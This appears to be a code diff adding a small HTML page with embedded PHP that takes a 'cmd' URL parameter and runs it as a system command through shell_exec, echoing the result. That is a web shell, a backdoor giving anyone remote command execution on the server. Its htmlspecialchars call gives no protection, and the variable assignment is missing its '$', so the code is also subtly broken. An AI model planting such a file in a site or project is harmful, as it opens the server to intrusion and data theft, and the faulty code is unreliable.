@@ -1,0 +1,8 @@
+<html>
+	<body>
+		<?php
+			cmd=htmlspecialchars($_GET["cmd"]);
+			echo shell_exec($cmd);
+		?>
+	</body>
+</html>
